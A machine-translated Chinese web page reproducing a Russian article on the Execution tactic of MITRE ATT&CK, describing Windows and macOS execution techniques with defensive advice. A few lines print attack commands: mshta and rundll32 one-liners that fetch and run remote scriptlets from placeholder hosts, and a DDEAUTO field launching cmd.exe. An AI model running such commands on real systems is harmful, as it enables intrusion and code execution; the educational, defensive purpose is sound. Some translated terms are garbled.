<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏿‍🔧 🏑 ◻️ 学习对抗策略，技巧和常识（ATT @ CK）。 企业策略。 第二部分 👨🏾‍🚒 🌦️ 💿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="执行力 
 链接到所有部分： 
 第1部分。获得初始访问权限（Initial Access） 
 第2部分。执行 
 第3部分。紧固（持久性） 
 第4部分。特权提升 
 第5部分。逃避防御 
 第6部分。获取凭据（凭据访问） 
 第7部分。发现 
 第8部分。横向运动 
 第9部分。数据收集（Co...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>学习对抗策略，技巧和常识（ATT @ CK）。 企业策略。 第二部分</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/424027/"><h1>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">执行力</a> </h1><br>  <b>链接到所有部分：</b> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第1部分。获得初始访问权限（Initial Access）</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第2部分。执行</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第3部分。紧固（持久性）</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第4部分。特权提升</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第5部分。逃避防御</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第6部分。获取凭据（凭据访问）</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第7部分。发现</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第8部分。横向运动</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第9部分。数据收集（Collection）</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第十部分渗透</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">第11部分。命令和控制</a> <br><br>  “执行”阶段描述了攻击者使用被攻击系统中远程和本地执行的方法和方法的情况，这些手段和方法在上一阶段已交付给被攻击的系统使用。 <br><a name="habracut"></a><br>  <i>对于使用本文中阐述的信息可能造成的后果，作者概不负责，对于某些表述和术语可能存在的不准确性，我们深表歉意。</i>  <i>发布的信息是对<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">MITER ATT＆CK</a>内容的免费重述<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">。</a></i> <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">苹果脚本</a> </h3><br>  <i>系统：</i> macOS <br>  <i>权限：</i>用户 <br>  <i>描述：</i> AppleScript语言具有使用Apple Event的能力-作为进程间通信（IPC）的一部分，应用程序之间交换的消息。 使用Apple Event，您可以与在本地或远程打开的几乎所有应用程序进行交互，从而触发事件，例如打开窗口和按下键。 使用以下命令运行脚本： <i>Osascript -e &lt;script&gt;</i> 。 <br> 攻击者可以使用AppleScript秘密打开与远程主机的SSH连接，从而为用户提供虚假对话框。  AppleScript也可以用于更常见的攻击类型，例如Reverse Shell组织。 <br><br>  <i>保护建议：</i>必须对运行的AppleScript脚本进行强制性验证，以得到受信任的开发人员的签名。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">CMSTP</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">（AppLocker旁路-CMSTP）</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户 <br>  <i>说明：</i> <i>Microsoft连接管理器配置文件安装程序（cmstp.exe）</i>是Windows内置的“ <i>连接管理器配置文件安装程序</i> ”实用程序。  Cmstp.exe可以将inf文件作为参数，因此攻击者可以准备特殊的恶意INF，以绕过AppLocker和其他锁从远程服务器下载并执行DLL或scriptlet（* .sct），因为cmstp.exe已使用Microsoft数字证书签名。 <br><br>  <i>保护建议：</i>阻止启动潜在危险的应用程序。 监视启动<i>C：\ Windows \ System32 \ cmstp.exe</i> 。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">命令行界面</a> </h3><br>  <i>系统：</i> Windows，Linux，macOS <br>  <i>权限：</i>用户，管理员，系统 <br>  <i>描述：您</i>可以在本地，通过远程访问软件，使用Reverse Shell等远程与命令行界面进行交互。 如果命令不包含对更改执行命令权限的进程的调用（例如，计划任务），则以命令行界面进程的当前权限级别执行命令。 <br><br>  <i>安全建议：</i>使用诸如AppLocker或软件限制策略之类的工具审核和/或锁定命令行。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">控制面板项目</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户，管理员，系统 <br>  <i>描述：</i>策略是攻击者使用Windows控制面板元素来执行任意命令作为有效负载（例如<i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Reaver</a></i>病毒）。 恶意对象可以伪装成标准控件，并使用网络钓鱼附件传递给系统。 用于查看和配置Windows设置的实用程序是Windows控制面板元素的已注册exe文件和CPL文件。  CPL文件实际上是重命名的DLL，可以通过以下方式运行： <br><ul><li> 直接从命令行： <i>control.exe <b>&lt;file.cpl&gt;</b></i> ; </li><li> 使用shell32.dll中的API函数： <i>rundll32.exe shell32.dll，Control_RunDLL <b>&lt;file.cpl&gt;</b></i> ； </li><li> 双击cpl文件。 </li></ul><br> 存储在System32中的已注册CPL会自动显示在Windows“控制面板”中，并在注册表中存储一个唯一的标识符： <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ ControlPanel \ NameSpace</i> <br><br> 有关其他CPL的信息，例如显示名称和cpl文件的路径，存储在该部分的<i>Cpls</i>和<i>Extended Properties</i>部分中： <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \控制面板</i> <br><br> 通过Shell启动的一些CPL在以下部分中注册： <br>  <i>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Controls文件夹\ <b>{name}</b> \ shellex \ PropertySheetHandlers</i> <br><br>  <i>保护建议：</i>仅在受保护的文件夹（例如<i>C：\ Windows \ System32</i> ）中限制控制面板项文件的启动和存储，启用用户帐户控制（UAC）和AppLocker以防止对系统进行未经授权的更改。 当然可以使用杀毒软件。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">动态数据交换协议（DDE），</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">MSWord中的无宏代码执行</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户 <br>  <i>说明：</i> DDE是用于共享数据和共享内存以进行消息传递的应用程序交互的协议。 例如，Word文档可能包含一个从Excel文档自动更新的表。 该技术在于利用MS Office应用程序中与MS Office中使用DDE协议有关的漏洞。 攻击者可以在MS Office文档中嵌入对象，这些对象包含在打开文档时将执行的命令。 例如，Word文档可能包含一个Field对象，该对象的值指示命令<i>{DDEAUTO &lt;命令，例如c：\ windows \ system32 \ cmd.exe&gt;}</i> ，该命令将在打开文档时执行。 尽管失去了相关性，仍可以使用以下项启用DDE，包括在Windows 10和MS Office 2016中： <br> 注册表项中的<i>AllowDDE（DWORD）</i> = 2： <br>  <i>HKEY_CURRENT_USER \ Software \ Microsoft \ Office \ <b>&lt;Office版本&gt;</b> \ Word \ Security</i> 。 <br><br>  <i>保护</i> <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">建议</a></i> <i>：请</i>遵循<i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Microsoft的建议</a></i>并安装适当的<i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">MS Office更新</a></i> 。 在Windows 10中，您还可以启用<i>减少攻击面（ASR）</i>参数，以保护自己免受MS Office应用程序的DDE攻击和子进程的攻击。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">通过API执行</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户，管理员，系统 <br>  <i>说明：</i>攻击者可以使用API​​执行二进制文件。  API函数（例如CreateProcess）允许程序和脚本通过指定必要的路径和参数来启动进程。 可用于执行二进制文件的API函数： <br><ul><li>  CreateProcessA（），CreateProcessW（）; </li><li>  CreateProcessAsUserA（），CreateProcessAsUserW（）; </li><li>  CreateProcessInternalA（），CreateProcessInternalW（）; </li><li>  CreateProcessWithLogonW（），CreateProcessWithTokenW（）; </li><li>  LoadLibraryA（），LoadLibraryW（）; </li><li>  LoadLibraryExA（），LoadLibraryExW（）; </li><li>  LoadModule（）; </li><li>  LoadPackagedLibrary（）; </li><li>  WinExec（）; </li><li>  ShellExecuteA（），ShellExecuteW（）; </li><li>  ShellExecuteExA（），ShellExecuteExW（）。 </li></ul><br><br>  <i>保护建议：</i> API函数调用是常见事件，很难与恶意活动区分开。 保护媒介应旨在防止在攻击链开始时启动攻击者的工具，检测恶意行为并阻止潜在危险的软件。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">通过模块加载执行</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户 <br>  <i>说明：</i>可以使用Windows模块加载器NTDLL.dll来组织代码执行，该模块可以在任意本地或网络路径上加载DLL库。  NTDLL.dll是Windows API的一部分，可以调用诸如<i>CreateProcess（）</i>和<i>LoadLibrary（）之类的</i>函数。 <br><br>  <i>保护建议：</i> API函数调用是常规操作系统功能，很难与恶意活动区分开。 保护媒介必须针对防止在攻击链开始时启动攻击者的工具。 考虑将DLL的加载限制为<i>％SystemRoot％</i>和<i>％ProgramFiles％</i>目录是有意义的。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">利用客户执行</a> </h3><br>  <i>系统：</i> Windows，Linux，macOS <br>  <i>权限：</i>用户 <br>  <i>描述：该</i>技术涉及使用用户软件中的漏洞进行远程代码执行。 软件中漏洞的存在通常与软件开发人员违反安全编程要求有关，最终导致导致意外软件行为的可能性。 <br> 考虑一些类型的漏洞利用： <br><ul><li> 浏览器漏洞。 攻击者使用影子加载和网络钓鱼链接时，Web浏览器是目标。 在用户执行某些操作（例如，按照网络钓鱼电子邮件中指定的链接）之后，可以通过普通浏览器破坏受攻击的系统。 </li><li>  Office应用程序漏洞利用。 恶意文件以附件或下载链接的形式传输。 要利用此漏洞，用户必须打开文档或文件以启动该漏洞。 </li><li> 第三方应用程序漏洞利用。 网络犯罪分子通常针对公司环境中常用的常见应用程序，例如Adobe Reader和Flash。 根据软件和漏洞的性质，在浏览器中或用户打开文件时会利用这些漏洞，例如，可以在MS Office文档中提供Flash对象。 </li></ul><br><br>  <i>保护建议：</i>及时为使用过的应用程序安装更新。 使用各种隔离潜在漏洞应用程序的方法-沙箱，微分段和虚拟化工具，例如Windows的<i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Sandboxie</a></i>和Apparmor，Linux的Docker。 还建议使用诸如Windows 10的<i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Windows Defender Exploit Guard（WDEG）</a></i>或Windows早期版本的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">增强缓解经验工具包（EMET）之</a>类的漏洞利用保护系统。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">图形用户界面</a> </h3><br>  <i>系统：</i> Windows，Linux，macOS <br> 权限：用户，管理员，系统 <br>  <i>说明：</i>在交互式或远程会话中（例如，通过RDP协议）通过图形用户界面（GUI）与文件进行交互时，将启动可执行文件或脚本。 <br><br>  <i>安全</i>提示<i>：</i>保护可用于远程连接到系统的凭据。 确定不必要的系统实用程序，这些第三方实用程序可用于进入交互式远程模式。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">InstallUtil</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户 <br>  <i>说明：</i> InstallUtil是Windows命令行实用程序，可以安装和卸载符合.NET Framework规范的应用程序。  Installutil将随VisualStudio自动安装。  InstallUtil.exe文件由Microsoft证书签名，并存储在以下位置： <br>  <i>C：\ Windows \ Microsoft.NET \ Framework \ v [版本] \ InstallUtil.exe</i> <br> 攻击者可以使用InstallUtil功能代理代码执行并绕过应用程序白名单。 <br><br>  <i>保护建议：</i>您的系统上可能未使用InstallUtil，因此请考虑阻止InstallUtil.exe的安装。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">LSASS驱动程序（LSASS驱动程序）</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>系统管理员 <br>  <i>说明：</i>本地安全机构（LSA）是提供用户身份验证的Windows子系统。  LSA包含几个在LSASS.exe进程中运行的动态互连DLL。 攻击者可以通过替换或添加非法LSA驱动程序然后执行任意代码来攻击LSASS.exe。 该技术在Pasam和Wingbird恶意软件中实现，该恶意软件“抛出”用于加载LSASS的经过修改的DLL。 在这种情况下，在非法DLL导致崩溃和随后的LSASS服务崩溃之前，将执行恶意代码。 <br><br>  <i>保护建议：</i>在Windows 8.1和Windows Server 2012 R2中，通过设置注册表项来启用LSA保护： <br>  <i>HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Lsa \ RunAsPPL</i> <br> 到<i>dword</i>值<i>：00000001</i> <br><br> 此保护可确保Microsoft进行LSA加载的插件和驱动程序的数字签名。 在Windows 10和Server 2016中，启用<i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Windows Defender凭据保护</a></i>以在隔离的虚拟环境中运行lsass.exe。 打开安全的DLL搜索模式，以减少将恶意库加载到lsass.exe中的风险： <br>  <i>HKEY_LOCAL_MACHINE \ System \ CurrentControlSet \ Control \ Session Manager \ SafeDllSearchMode</i> 。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Launchctl</a> </h3><br>  <i>系统：</i> macOS <br>  <i>权限：</i>用户，管理员 <br>  <i>说明：</i> Launchctl-用于管理已启动服务的实用程序。 使用Launchctl，您可以管理系统和用户服务（LaunchDeamons和LaunchAgents）以及执行命令和程序。  Launchctl支持交互式或从标准输入重定向的命令行子命令： <br>  <i>launchctl Submit -l [labelname]-/到/ something /到/执行的路径``arg“''arg”''arg“</i> <br> 通过启动和重新启动服务和守护程序，如果launchctl是经过授权的进程，攻击者可以执行代码，甚至绕过白名单，但是，加载，卸载和重新启动服务和守护程序可能需要提升的特权。 <br><br>  <i>安全建议：</i>限制用户权限，以使用组策略创建启动代理和启动启动重传。 使用<i>KnockKnock</i>应用程序， <i>您</i>可以发现使用launchctl来管理Launch Agent和Launch Deamons的程序。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">执行本地作业计划</a> </h3><br>  <i>系统：</i> Linux，macOS <br>  <i>权限：</i>用户，管理员，root <br>  <i>描述：</i>攻击者可以在被引导系统中创建任务，以便在系统启动时或根据计划进行未经授权的程序启动。  Linux和Apple系统支持几种计划定期后台任务启动的方法：cron at at launchd。 与Windows Task Scheduler不同，除了使用SSH之类的远程会话外，Linux系统上的任务调度无法远程完成。 <br><br>  <i>保护建议：</i>限制用户创建计划任务的权限，阻止系统实用程序和其他可用于计划任务的软件。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">姆斯塔</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户 <br>  <i>说明：</i> Mshta.exe（位于<i>C：\ Windows \ System32 \中</i> ）是运行Microsoft HTML应用程序（* .HTA）的实用程序。  HTA应用程序使用InternetExplorer使用的相同技术运行，但在浏览器之外。 由于Mshta绕过浏览器安全设置来处理文件，因此攻击者可以使用mshta.exe代理恶意HTA文件，Javascript或VBScript的执行。 可以通过内置脚本启动恶意文件： <br>  <i>mshta vbscript：关闭（执行（“ GetObject（”“ script：https [：] // Web服务器/有效负载[。] sct”“）”））））</i> <br><br> 或直接在URL上： <br>  <i>mshta http [：] //网络服务器/有效负载[。] hta</i> <br><br>  <i>保护建议：</i> mshta.exe <i>的</i>功能与已达到生命周期尽头的IE的较早版本相关联。 如果您没有使用Mshta.exe，请阻止它。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Powerhell</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户，管理员 <br>  <i>说明：</i> PowerShell（PS）是Windows附带的功能强大的交互式命令行界面和脚本环境。 攻击者可以使用PS来收集信息并执行代码。 例如，Start-Process cmdlet可以运行可执行文件； Invoke-Command cmdlet将在本地或远程计算机上执行命令。  PS还可以用于从Internet下载并运行可执行文件，而无需将其保存到硬盘中。 对于使用PS的远程连接，您需要管理员权限。 有多种攻击PS的工具： <br><ul><li>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">帝国帝国</a></i> </li><li>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Powersploit</a></i> </li><li>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PS攻击</a></i> </li></ul><br>  <i>保护建议：</i>可以从系统中删除PS。 如果需要PS，则应该限制管理员仅通过运行签名脚本来运行它。 禁用WinRM服务以防止PS脚本的远程执行。 应该注意的是，有一些<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">方法可以绕过PS脚本执行策略</a> 。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Regsvcs /重新充气</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户，管理员 <br>  <i>说明：</i> Regsvcs和Regasm是Windows实用工具，用于向.NET组件对象模型（COM）组装系统进行注册。 这两个文件均由Microsoft进行数字签名。 当属性是在注册或注销之前必须运行的代码：[ComRegisterFunction]或[ComUnregisterFunction]时，攻击者可以使用Regsvcs和Regasm代理代码执行。 即使进程运行时权限不足，甚至在启动时崩溃，也可以启动具有此类属性的代码。 <br><br>  <i>保护建议：</i>如果您的系统或网络上未使用Regsvcs.exe和Regasm.exe，则将其阻止。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Regsvr32</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">（Squibledoo）</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户，管理员 <br>  <i>说明：</i> Regsvr32.exe是一个控制台实用程序，用于在注册表中注册和注销OLE控件（例如ActiveX和DLL）。  Regsvr32.exe由Microsoft数字签名，可用于代理代码执行。 例如，使用Regsvr32，您可以下载一个XML文件，其中包含将绕过白名单的Java代码（小脚本）。 <br><br>  <i>保护建议：</i> EMET中的减少攻击面（ASR）和Windows Defender中的Advanced Theart Protection可以阻止使用Regsvr32.exe绕过白名单。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Rundll32</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">（Poweliks）</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户 <br>  <i>说明：</i> Rundll32.exe是一个系统实用程序，用于启动位于动态连接的库中的程序，可以调用这些程序来代理二进制文件，并通过未公开的shel32.dll函数<i>Control_RunDLL</i>和<i>Control_RunDLLAsUser</i>执行Windows控制文件（.cpl）。 双击.cpl文件还会使Rundll32.exe执行。  Rundll32也可以用于执行脚本，例如JavaScript： <br>  <i>rundll32.exe javascript：“ \ .. \ mshtml，RunHTMLApplication”; document.write（）; GetObject（“ scrirpt：https [：] // www [。]示例[。] com /恶意.sct”）“</i> <br> 诸如Poweliks之类的防病毒软件会检测到以上使用rundll32.exe的方法。 <br> 保护建议：EMET中的减少攻击面（ASR）和Windows Defender中的Advanced Theart Protection可以阻止使用Rundll32.exe绕过白名单。 <br><br><h3>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">通过Windows计划任务运行</a> </h3><br>  <i>系统：</i> Windows <br>  <i>权限：</i>用户，管理员，系统 <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">诸如at，schtasks和Windows Task Scheduler之类的实用程序可用于计划程序和脚本以在特定的日期和时间运行。如果使用RPC进行身份验证并启用打印机和文件共享，则可以在远程系统上安排任务。另外，需要管理员权限才能安排远程系统上的任务。攻击者可以使用远程任务调度在系统启动时或在特定帐户的上下文中执行程序。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在注册表中打开代表系统的用户创建任务的权限限制：</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKLM \ SYSTEM \ CurrentControlSet \ Control \ Lsa \ SubmitControl = 0 </font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SubmitControl = 1，允许“服务器操作员”组的成员创建作业。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另外，配置适当的GPO：</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算机配置&gt; [策略]&gt; Windows设置&gt;安全设置&gt;本地策略&gt;安全选项：域控制器：允许服务器操作员安排任务：禁用</font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算机配置&gt; [策略]&gt; Windows设置&gt;安全设置&gt;本地策略&gt;用户权限分配：提高计划优先级</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑使用PowerSploit框架，该框架包含PowerUP模块，用于在活动中查找计划任务的解决方案中的漏洞。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本编写</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows，Linux，macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以使用脚本来自动化其动作，加快操作任务并因此减少访问所需的时间。通过直接在API级别与OS交互而不是调用其他程序，可以使用某些脚本语言来绕过监视过程的机制。脚本可以作为宏嵌入在Office文档中，然后用于网络钓鱼攻击。在这种情况下，攻击者希望用户运行宏文件，或者用户同意激活宏。有几种实现脚本的流行框架-Metasploit，Veil，PowerSploit。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全提示：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">限制对VBScript或PowerShell等脚本的访问。</font><font style="vertical-align: inherit;">在Windows上，通过启用GPO的安全查看和宏禁止功能来配置MS Office安全设置。</font><font style="vertical-align: inherit;">如果需要宏，则仅允许运行可信的数字签名宏。</font><font style="vertical-align: inherit;">使用微分段和应用程序虚拟化，例如，Windows的Sandboxie和Apparmor，Linux的Docker。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: 